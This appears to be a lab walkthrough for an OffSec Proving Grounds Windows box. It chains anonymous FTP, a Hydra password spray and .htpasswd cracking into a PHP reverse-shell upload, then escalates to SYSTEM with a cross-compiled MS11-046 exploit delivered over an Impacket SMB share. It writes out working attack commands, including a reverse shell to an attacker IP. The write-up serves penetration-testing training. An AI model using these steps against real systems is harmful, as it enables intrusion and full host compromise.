
## Overview

**Platform:** OffSec Proving Grounds **Operating System:** Windows (Server 2008-era, build 6001) **Services:** zFTPServer (21/3145), Apache/PHP on a non-standard port (242), RDP (3389) **Initial Access:** Anonymous FTP → username list leak → Hydra password spray → cracked `.htpasswd` hash → authenticated web login → FTP write access to web root → PHP webshell upload → RCE **Initial Access Type:** Credential harvesting + file-upload chain across two services **Privilege Escalation:** MS11-046 (`afd.sys`) local kernel exploit, compiled from source and delivered via an Impacket SMB server **Final Access:** SYSTEM

### Key Techniques

- Full aggressive Nmap scan (`-p- -A -T5`)
- Anonymous FTP enumeration
- Inferring valid usernames from directory/account naming conventions
- Hydra credential spraying (userlist rotation, not password rotation)
- Reading a `.htpasswd` file over FTP
- `john` hash cracking (Apache MD5/apr1)
- Testing FTP write access before committing to an upload-based attack
- HTTP Basic Auth with cracked credentials
- PHP reverse shell upload via FTP, triggered via authenticated `curl`
- Post-exploitation enumeration (users, groups, network, processes/services)
- Recognizing when `windows-exploit-suggester.py` is failing due to missing hotfix data, and pivoting to manual research
- Cross-referencing OS version + build number for known kernel LPEs
- Compiling a C exploit for Windows using `mingw` cross-compilation
- Delivering a compiled exploit via Impacket's `smbserver.py`

---

# Attack Path

```text
nmap -p- -A -T5
        ↓
21: zFTPServer (Anonymous Login Allowed)
242: Apache/PHP (HTTP Basic Auth)
3145: zFTPServer Admin
3389: RDP
        ↓
Anonymous FTP — Enumerate accounts/ Directory
        ↓
Infer Valid Usernames (Offsec, admin) From Naming Pattern
        ↓
Hydra Password Spray Across Username List
        ↓
FTP Login Succeeds — Read-Only Access to 3 Files
        ↓
.htpasswd File Read Over FTP
        ↓
john Cracks apr1 Hash — offsec:elite
        ↓
Test FTP Write Access — Confirmed Writable (Web Root!)
        ↓
Authenticate to Web App (242) With Cracked Creds
        ↓
Upload PHP Reverse Shell via FTP
        ↓
Trigger via Authenticated curl Request
        ↓
Shell as Web Service User
        ↓
Post-Exploitation Enumeration
        ↓
windows-exploit-suggester.py Fails (No Hotfix Data)
        ↓
Manual Research: Windows Server 2008 Build 6001 + Google
        ↓
MS11-046 (afd.sys) Identified
        ↓
Compile Exploit With mingw Cross-Compiler
        ↓
Deliver via impacket smbserver.py + copy
        ↓
Execute pwn.exe
        ↓
SYSTEM Shell
```

---

# 1. Nmap Enumeration

```bash
nmap -Pn -p- -A -T5 -o deleteme.txt <target>
```

```text
21/tcp    ftp        zFTPServer 6.0 — Anonymous login allowed
242/tcp   http       Apache 2.2.21 (Win32) PHP/5.3.8 — HTTP Basic Auth required
3145/tcp  zftp-admin
3389/tcp  ms-wbt-server (RDP)
```

Web service on a **non-standard port** (`242`) — worth remembering that Nmap's `-p-` full sweep is what catches this; a default top-1000 scan would likely have missed it entirely.

---

# 2. FTP Enumeration

```text
ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

Anonymous login gives read access to list a number of directories, but actual file/subdirectory contents in most of them are inaccessible. The **`accounts/`** directory, however, gives away something useful just from its structure/naming.

> [!tip] Recognition Pattern Even when contents of a directory aren't directly readable, the directory's **existence and naming** can leak information. An `accounts/` folder — even one whose files can't be opened — is a strong hint about what usernames might exist on the system, especially if entries inside it are named after actual accounts.

## Building a username list

Inferred two additional usernames (`Offsec`, `admin`) from the naming pattern observed, added them to a list alongside the already-confirmed `anonymous`:

```bash
echo 'Offsec' >> usernames.txt
echo 'admin' >> usernames.txt
```

## Hydra password spray

```bash
hydra -I -V -f -L usernames.txt -u -P /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt <target> ftp
```

- `-I` — ignore any restore file from a previous run
- `-V` — verbose output
- `-f` — stop on first valid hit
- `-L` — username list
- `-u` — **rotate through usernames first**, testing each username against the current password before moving to the next password (rather than exhausting one username's full password list before moving on)
- `-P` — password wordlist

> [!tip] Key Principle `-u` changes Hydra's iteration order: instead of hammering one account with a huge wordlist, it sprays a smaller set of usernames per password attempt. This is exactly **password spraying** rather than traditional brute-forcing — lower per-account attempt volume, better suited to a small, curated username list against a large password list, and generally less likely to trigger account lockouts on a real target.

A valid credential pair is found. Logging in gives **read-only access to three specific files**.

---

# 3. Credential Leak — `.htpasswd`

```bash
ftp> less .htpasswd
```

Contains a hash for the `offsec` user:

```text
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
```

`$apr1$` is Apache's own MD5-based hash format, used specifically for HTTP Basic Auth password files (`.htpasswd`) — directly relevant given the Basic Auth prompt seen on port 242.

## Cracking with john

```bash
echo 'offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0' > offsec.txt
john --wordlist=/usr/share/seclists/Passwords/xato-net-10-million-passwords.txt offsec.txt
```

Cracked: `offsec:elite`

> [!tip] Recognition Pattern Any time HTTP Basic Auth (`WWW-Authenticate: Basic`) shows up on a target, an accessible `.htpasswd` file anywhere else on the box (via FTP, LFI, misconfigured web access, etc.) is a direct path to those exact credentials — the hash format (`$apr1$`) is a strong signal this is precisely what it's for.

---

# 4. Testing Write Access

Before committing to a full upload-based attack, tested whether the FTP account actually had write permissions with a low-risk file:

```bash
ftp> put scan.nmap
```

Succeeded — confirming the FTP account can write into what turns out to be the **web root** for port 242's application.

> [!tip] Key Principle Test write access with a harmless file before uploading an actual payload. It confirms the capability exists and, critically, confirms _where_ the file lands relative to anything web-accessible — both facts you need before crafting and uploading a real webshell.

---

# 5. Exploitation — PHP Webshell via FTP Upload

Confirmed the cracked web credentials (`offsec:elite`) work against the Basic Auth prompt on port 242.

## Preparing the payload

```bash
wget https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php -O shell.php
```

Edited the shell's target IP/port:

```php
$sh = new Shell('<attacker_ip>', 9000);
```

## Delivery via FTP

```bash
ftp> put shell.php
```

Since FTP write access lands directly in the web root (confirmed in the previous step), the uploaded file is immediately web-accessible.

## Triggering

```bash
sudo rlwrap nc -lnvp 53
```

```bash
curl -u 'offsec:elite' -X GET http://<target>:242/shell.php
```

The `-u` flag supplies HTTP Basic Auth credentials directly in the request — necessary since the whole web app (including the uploaded shell) sits behind Basic Auth.

Shell received.

> [!tip] Recognition Pattern When a web app is behind HTTP Basic Auth, remember that _every_ request to it — including one meant to trigger an uploaded webshell — needs those credentials attached (`curl -u user:pass`, or entering them in the browser). Forgetting this on a shell-trigger request is an easy way to get a confusing "it didn't work" when the payload itself was fine.

---

# 6. Post-Exploitation Enumeration

Standard sweep after landing a shell: current user context, OS/kernel version, local users and groups, network interfaces, listening ports, running processes and services — establishing the full picture of the host before attempting privesc.

---

# 7. Privilege Escalation

## Automated tooling comes up empty

```bash
python windows-exploit-suggester.py ...
```

Returns nothing useful.

> [!tip] Recognition Pattern `windows-exploit-suggester.py` (and similar tools) work by comparing installed hotfixes/patches against a Microsoft patch bulletin database — if the target has **no hotfixes installed at all** (common on an intentionally unpatched practice box), there's nothing for the tool to diff against, and it can fail to suggest anything even on a heavily vulnerable host. A blank result from this class of tool isn't proof the box is unexploitable — it may just mean the tool's comparison method doesn't apply well here.

## Manual research

Searched directly for the OS version and build number:

```text
windows server 2008 standard 6001 privilege escalation
```

First result: **MS11-046**.

```bash
searchsploit ms11-046
```

Found: _Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation_ — Exploit-DB 40564.c, a kernel-level LPE in the AFD (Ancillary Function Driver) affecting this era of Windows.

> [!tip] Key Principle When automated exploit-suggestion tooling fails, fall back to manually cross-referencing the exact **OS version and build number** (visible from `systeminfo`, the Nmap RDP fingerprint, or similar) against known LPE advisories — Microsoft's own KB/MS bulletin numbering system is searchable directly and often surfaces exactly the right result faster than waiting on an automated tool to work around missing patch data.

## Compiling the exploit

```bash
searchsploit -m 40564
i686-w64-mingw32-gcc 40564.c -o pwn.exe -lws2_32
```

Cross-compiling a Windows PE binary from C source directly on Kali using `mingw` — `-lws2_32` links the Winsock library the exploit needs for its network calls.

> [!tip] Recognition Pattern Many older Windows LPE exploits on Exploit-DB are raw C source, not pre-compiled binaries — `mingw`'s cross-compilation toolchain (`i686-w64-mingw32-gcc` for 32-bit targets, `x86_64-w64-mingw32-gcc` for 64-bit) lets you build a working Windows `.exe` directly from Kali without needing a Windows dev environment. Worth keeping this exact compilation pattern on hand for any C-source Windows exploit.

## Delivering the compiled exploit

```bash
smbserver.py -smb2support evil $PWD
```

Impacket's `smbserver.py` spins up a quick, ad-hoc SMB share directly from the current working directory — no target-side write access or separate file transfer method needed, since the target can simply reach out and copy from it.

**On the target:**

```powershell
copy \\<attacker_ip>\evil\pwn.exe .
.\pwn.exe
```

SYSTEM shell obtained.

> [!tip] Key Principle `impacket-smbserver` is one of the fastest ways to get a file onto a Windows target when you already have _some_ level of command execution — no need for FTP, HTTP hosting, or certutil tricks; the target just needs SMB client capability (built into Windows by default) and network reachability back to the attacker.

---

# Recognition Patterns

|Observation|Investigate|
|---|---|
|Directory contents unreadable but structure/naming visible|Infer possible usernames or system details from naming conventions alone|
|Need to test multiple usernames against a curated password list|Use Hydra with `-u` for password-spray ordering rather than brute-force ordering|
|HTTP Basic Auth present anywhere on the target|Look for an accessible `.htpasswd` file via any other service|
|About to upload a real payload via a writable share/FTP|Test with a harmless file first to confirm write access and web-root location|
|Target is behind HTTP Basic Auth|Every request needs credentials attached, including shell-trigger requests|
|`windows-exploit-suggester.py` (or similar) returns nothing|Check whether the target has any hotfixes installed at all — tool may be failing on missing comparison data, not absence of vulnerabilities|
|Automated LPE suggestion tooling fails|Manually search the exact OS version/build number for known MS bulletins|
|Exploit-DB LPE is raw C source|Cross-compile with `mingw` (`i686-w64-mingw32-gcc` / `x86_64-w64-mingw32-gcc`)|
|Need to deliver a file to a Windows target with only command execution|`impacket-smbserver` for an ad-hoc share, `copy \\attacker\share\file .` on the target|

---

# Key Lessons

> [!tip] Directory Structure Can Leak Usernames Even Without File Access An unreadable `accounts/` folder's mere existence and any visible naming pattern within it is still reconnaissance value — infer candidate usernames from it rather than dismissing an inaccessible directory as useless.

> [!tip] `.htpasswd` Exposure Anywhere Is a Direct Credential Leak If HTTP Basic Auth is in use anywhere on a target, actively hunt for an accessible `.htpasswd` via any other exposed service — it's often crackable and gives exactly the credentials needed.

> [!tip] Test Write Access Before Committing to a Payload A quick harmless file upload confirms both write capability and file landing location before investing effort in crafting and deploying a real webshell.

> [!tip] Automated Privesc Tooling Can Fail Silently for Structural Reasons A blank result from `windows-exploit-suggester.py` or similar doesn't mean the box is unexploitable — check whether the comparison data (installed hotfixes) even exists before trusting a negative result, and fall back to manual OS-version research when it doesn't.

> [!tip] Keep the mingw + impacket-smbserver Combo Ready for Windows LPEs Raw C-source Windows exploits and simple file delivery are common enough on older Windows boxes that this exact pair of tools (`mingw` cross-compilation, `impacket-smbserver` for delivery) is worth having memorized as a fast, reliable default.